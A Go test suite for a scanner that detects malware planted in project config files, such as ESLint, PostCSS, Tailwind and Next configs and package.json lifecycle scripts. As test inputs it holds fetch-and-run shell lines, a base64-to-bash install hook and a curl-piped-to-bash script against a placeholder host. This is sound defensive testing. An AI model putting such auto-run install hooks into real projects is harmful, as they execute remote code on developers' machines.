package scanner

import (
	"testing"

	"github.com/mirzasaikatahmmed/gitshield/internal/signatures"
)

func newTestEngine(t *testing.T) *Engine {
	t.Helper()
	sigs, err := signatures.Default()
	if err != nil {
		t.Fatalf("loading default signatures: %v", err)
	}
	return NewEngine(sigs)
}

func TestCleanFixturesScoreClean(t *testing.T) {
	e := newTestEngine(t)
	res, err := e.ScanDir("testdata/clean")
	if err != nil {
		t.Fatalf("ScanDir: %v", err)
	}
	if res.Severity != Clean {
		t.Fatalf("expected CLEAN, got %s (files with findings: %+v)", res.Severity, res.Files)
	}
	if res.FilesScanned == 0 {
		t.Fatalf("expected at least one target file to be scanned")
	}
	if len(res.Files) != 0 {
		t.Fatalf("expected no findings in clean fixtures, got %+v", res.Files)
	}
}

func TestInfectedEslintConfigIsHighViaExactMatch(t *testing.T) {
	e := newTestEngine(t)
	fr, err := e.ScanFile("testdata/infected/eslint.config.mjs")
	if err != nil {
		t.Fatalf("ScanFile: %v", err)
	}
	if fr.Severity != High {
		t.Fatalf("expected HIGH, got %s", fr.Severity)
	}
	foundExact := false
	for _, f := range fr.Findings {
		if f.Kind == "exact" {
			foundExact = true
		}
	}
	if !foundExact {
		t.Fatalf("expected at least one exact-match finding, got %+v", fr.Findings)
	}
}

func TestInfectedPostcssConfigIsModerateViaSingleHeuristic(t *testing.T) {
	e := newTestEngine(t)
	fr, err := e.ScanFile("testdata/infected/postcss.config.mjs")
	if err != nil {
		t.Fatalf("ScanFile: %v", err)
	}
	if fr.Severity != Moderate {
		t.Fatalf("expected MODERATE, got %s (findings: %+v)", fr.Severity, fr.Findings)
	}
	for _, f := range fr.Findings {
		if f.Kind == "exact" {
			t.Fatalf("expected no exact matches, got %+v", f)
		}
	}
	if len(fr.Findings) != 1 {
		t.Fatalf("expected exactly 1 heuristic finding, got %d: %+v", len(fr.Findings), fr.Findings)
	}
}

func TestInfectedPostcssObfuscatedCampaignIsHigh(t *testing.T) {
	e := newTestEngine(t)
	fr, err := e.ScanFile("testdata/infected/postcss.config.obfuscated.mjs")
	if err != nil {
		t.Fatalf("ScanFile: %v", err)
	}
	if fr.Severity != High {
		t.Fatalf("expected HIGH, got %s (findings: %+v)", fr.Severity, fr.Findings)
	}
	foundCampaign := false
	for _, f := range fr.Findings {
		if f.SignatureID == "campaign-id-a8-5741" || f.SignatureID == "campaign-id-a8-regex" {
			foundCampaign = true
		}
	}
	if !foundCampaign {
		t.Fatalf("expected campaign ID signature match, got %+v", fr.Findings)
	}
}

func TestInfectedTailwindConfigIsHighViaTwoHeuristics(t *testing.T) {
	e := newTestEngine(t)
	fr, err := e.ScanFile("testdata/infected/tailwind.config.js")
	if err != nil {
		t.Fatalf("ScanFile: %v", err)
	}
	if fr.Severity != High {
		t.Fatalf("expected HIGH, got %s (findings: %+v)", fr.Severity, fr.Findings)
	}
	for _, f := range fr.Findings {
		if f.Kind == "exact" {
			t.Fatalf("expected only heuristic matches (no exact IOC), got %+v", f)
		}
	}
	if len(fr.Findings) < 2 {
		t.Fatalf("expected 2+ heuristic findings, got %d: %+v", len(fr.Findings), fr.Findings)
	}
}

func TestInfectedGitignoreWormMarkerIsHigh(t *testing.T) {
	e := newTestEngine(t)
	fr, err := e.ScanFile("testdata/infected/.gitignore")
	if err != nil {
		t.Fatalf("ScanFile: %v", err)
	}
	if fr.Severity != High {
		t.Fatalf("expected HIGH, got %s (findings: %+v)", fr.Severity, fr.Findings)
	}
}

func TestInfectedPolinRiderNextConfigIsHigh(t *testing.T) {
	e := newTestEngine(t)
	fr, err := e.ScanFile("testdata/infected/next.config.mjs")
	if err != nil {
		t.Fatalf("ScanFile: %v", err)
	}
	if fr.Severity != High {
		t.Fatalf("expected HIGH, got %s (findings: %+v)", fr.Severity, fr.Findings)
	}
}

func TestInfectedConfigBatIsHigh(t *testing.T) {
	e := newTestEngine(t)
	fr, err := e.ScanFile("testdata/infected/config.bat")
	if err != nil {
		t.Fatalf("ScanFile: %v", err)
	}
	if fr.Severity != High {
		t.Fatalf("expected HIGH, got %s (findings: %+v)", fr.Severity, fr.Findings)
	}
}

func TestScanDirAggregatesWorstSeverity(t *testing.T) {
	e := newTestEngine(t)
	res, err := e.ScanDir("testdata/infected")
	if err != nil {
		t.Fatalf("ScanDir: %v", err)
	}
	if res.Severity != High {
		t.Fatalf("expected overall HIGH, got %s", res.Severity)
	}
	if len(res.Files) != 7 {
		t.Fatalf("expected 7 files with findings, got %d: %+v", len(res.Files), res.Files)
	}
}

func TestTargetPathspecsMatchesTargetGlobs(t *testing.T) {
	specs := TargetPathspecs()
	if len(specs) != len(targetGlobs) {
		t.Fatalf("TargetPathspecs() len = %d, want %d", len(specs), len(targetGlobs))
	}
}

func TestIsTargetFile(t *testing.T) {
	cases := map[string]bool{
		"eslint.config.mjs":      true,
		"a/b/tailwind.config.js": true,
		".eslintrc":              true,
		".eslintrc.json":         true,
		".gitignore":             true,
		"package.json":           true,
		"a/b/package.json":       true,
		"webpack.config.js":      false,
		"README.md":              false,
	}
	for path, want := range cases {
		if got := IsTargetFile(path); got != want {
			t.Errorf("IsTargetFile(%q) = %v, want %v", path, got, want)
		}
	}
}

func TestIsDeepTargetFile(t *testing.T) {
	cases := map[string]bool{
		"server-init.js":     true,
		"foo.mjs":            true,
		"foo.cjs":            true,
		"eslint.config.js":   true, // already a known target too; deep doesn't need to exclude it
		"sub/nested-evil.js": false,
		"foo.ts":             false,
		"package.json":       false,
	}
	for path, want := range cases {
		if got := IsDeepTargetFile(path); got != want {
			t.Errorf("IsDeepTargetFile(%q) = %v, want %v", path, got, want)
		}
	}
}

func TestNonDeepScanDirExcludesArbitraryJSFile(t *testing.T) {
	e := newTestEngine(t)
	res, err := e.ScanDir("testdata/infected")
	if err != nil {
		t.Fatalf("ScanDir: %v", err)
	}
	for _, fr := range res.Files {
		if fr.Path == "server-init.js" {
			t.Fatalf("non-deep scan should not have scanned server-init.js, got %+v", fr)
		}
	}
}

func TestDeepScanDirIncludesArbitraryJSFile(t *testing.T) {
	e := newTestEngine(t)
	e.Deep = true
	res, err := e.ScanDir("testdata/infected")
	if err != nil {
		t.Fatalf("ScanDir: %v", err)
	}
	var found *FileResult
	for i := range res.Files {
		if res.Files[i].Path == "server-init.js" {
			found = &res.Files[i]
		}
	}
	if found == nil {
		t.Fatalf("expected --deep scan to include server-init.js, got %+v", res.Files)
	}
	if found.Severity != Moderate {
		t.Fatalf("expected server-init.js to be MODERATE (single heuristic), got %s: %+v", found.Severity, found.Findings)
	}
	if len(found.Findings) != 1 || found.Findings[0].SignatureID != "heuristic-spawn-detached-eval" {
		t.Fatalf("expected exactly 1 spawn-detached-eval finding, got %+v", found.Findings)
	}
}

func TestDeepScanDirDoesNotAffectCleanJSFile(t *testing.T) {
	e := newTestEngine(t)
	e.Deep = true
	res, err := e.ScanDir("testdata/clean")
	if err != nil {
		t.Fatalf("ScanDir: %v", err)
	}
	if res.Severity != Clean {
		t.Fatalf("expected CLEAN even with --deep, got %s: %+v", res.Severity, res.Files)
	}
}

func TestInfectedPackageJSONPostinstallWormIsHigh(t *testing.T) {
	e := newTestEngine(t)
	fr, err := e.ScanFile("testdata/infected/package.json")
	if err != nil {
		t.Fatalf("ScanFile: %v", err)
	}
	if fr.Severity != High {
		t.Fatalf("expected HIGH, got %s (findings: %+v)", fr.Severity, fr.Findings)
	}
	ids := map[string]bool{}
	for _, f := range fr.Findings {
		if f.Kind == "exact" {
			t.Fatalf("expected only heuristic matches, got %+v", f)
		}
		ids[f.SignatureID] = true
	}
	if !ids["heuristic-postinstall-curl-pipe-shell"] {
		t.Fatalf("expected curl-pipe-shell finding, got %+v", fr.Findings)
	}
	if !ids["heuristic-postinstall-powershell-cradle"] {
		t.Fatalf("expected powershell-cradle finding, got %+v", fr.Findings)
	}
}

func TestCleanPackageJSONHasNoPostinstallFindings(t *testing.T) {
	e := newTestEngine(t)
	fr, err := e.ScanFile("testdata/clean/package.json")
	if err != nil {
		t.Fatalf("ScanFile: %v", err)
	}
	if fr.Severity != Clean {
		t.Fatalf("expected CLEAN, got %s (findings: %+v)", fr.Severity, fr.Findings)
	}
}

func TestPostinstallBase64PipeShellHeuristic(t *testing.T) {
	e := newTestEngine(t)
	content := []byte(`{
  "scripts": {
    "install": "echo bWFsaWNpb3Vz | base64 -d | bash"
  }
}
`)
	findings := e.ScanBytes("package.json", content)
	found := false
	for _, f := range findings {
		if f.SignatureID == "heuristic-postinstall-base64-shell" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected heuristic-postinstall-base64-shell finding, got %+v", findings)
	}
	sev := e.Severity(findings)
	if sev != Moderate {
		t.Fatalf("expected MODERATE (single heuristic hit), got %s: %+v", sev, findings)
	}
}

func TestPostinstallHeuristicsIgnoreNonLifecycleScripts(t *testing.T) {
	e := newTestEngine(t)
	content := []byte(`{
  "scripts": {
    "test": "curl -fsSL https://example.test/report.sh | bash"
  }
}
`)
	findings := e.ScanBytes("package.json", content)
	for _, f := range findings {
		if f.SignatureID == "heuristic-postinstall-curl-pipe-shell" {
			t.Fatalf("non-auto-run script should not trigger the postinstall heuristic, got %+v", f)
		}
	}
}

func TestLongLineHeuristicIgnoresGitignore(t *testing.T) {
	e := newTestEngine(t)
	longLine := make([]byte, 3000)
	for i := range longLine {
		longLine[i] = 'a'
	}
	findings := e.ScanBytes(".gitignore", longLine)
	for _, f := range findings {
		if f.SignatureID == "heuristic-long-line" {
			t.Fatalf(".gitignore should not trigger the long-line heuristic, got %+v", f)
		}
	}
}
